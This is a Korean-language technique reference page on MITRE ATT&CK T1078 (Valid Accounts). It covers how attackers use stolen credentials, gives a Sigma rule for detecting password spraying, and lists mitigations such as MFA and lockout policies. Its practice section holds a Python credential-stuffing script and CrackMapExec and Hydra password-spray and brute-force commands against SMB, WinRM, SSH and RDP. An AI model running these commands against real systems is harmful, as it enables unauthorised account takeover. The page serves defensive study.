# T1078 — Valid Accounts

## 개요

**TA0001 / T1078**  
합법적인 계정 자격증명을 사용해 시스템에 접근하는 기법입니다. 공격자는 Credential Stuffing, 피싱, 다크웹 구매, 브루트포스 등의 방법으로 자격증명을 획득합니다. 정상 계정을 사용하기 때문에 탐지가 매우 어렵습니다.

---

## 동작 방식

1. 공격자가 외부에서 자격증명을 획득 (피싱, 다크웹, 데이터 유출 등)
2. 획득한 자격증명으로 VPN, OWA, SSH 등 외부 노출 서비스에 인증 시도
3. 인증 성공 시 정상 사용자처럼 내부망에 접근
4. 이후 정찰, 권한 상승, 횡이동 등 후속 공격 수행

---

## 주요 커맨드 / 실습

### Credential Stuffing (Python)
```python
import requests

credentials = [("user1", "pass1"), ("user2", "pass2")]
target = "https://target.com/login"

for user, pwd in credentials:
    r = requests.post(target, data={"username": user, "password": pwd})
    if "Welcome" in r.text:
        print(f"[+] Valid: {user}:{pwd}")
```

### CrackMapExec Password Spray
```bash
# SMB 패스워드 스프레이 (계정 잠금 방지를 위해 단일 패스워드 사용)
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success

# WinRM 패스워드 스프레이
crackmapexec winrm 192.168.1.0/24 -u users.txt -p 'Password123!'
```

### Hydra Default Credential Check
```bash
# SSH 기본 자격증명 확인
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# RDP 브루트포스
hydra -t 4 -l administrator -P passwords.txt rdp://192.168.1.10
```

---

## 탐지 방법

### Sigma Rule
```yaml
title: Password Spray Attack Detection
id: e6ce8457-68b1-485b-9bdd-3c4f337942e1
status: stable
description: Detects password spray attacks via multiple failed logons from single IP
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
        LogonType: 3
    condition: selection | count(TargetUserName) by IpAddress > 10
timeframe: 1m
falsepositives:
    - Vulnerability scanners
    - Legitimate bulk authentication
level: high
tags:
    - attack.initial_access
    - attack.t1078
```

---

## 대응 방안

1. MFA 전사 적용 (FIDO2/WebAuthn 권장)
2. 계정 잠금 정책 설정 (5회 실패 시 30분 잠금)
3. UEBA(User and Entity Behavior Analytics) 도입으로 비정상 로그인 탐지
4. PIM/PAM(Privileged Identity/Access Management) 솔루션 도입
5. 자격증명 유출 모니터링 (HaveIBeenPwned API, 다크웹 모니터링)
6. 지리적 불가능 로그인(Impossible Travel) 탐지 규칙 설정

---

## 참고자료
- [MITRE ATT&CK T1078](https://attack.mitre.org/techniques/T1078/)
- [CrackMapExec GitHub](https://github.com/byt3bl33d3r/CrackMapExec)
- [NIST SP 800-63B - Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
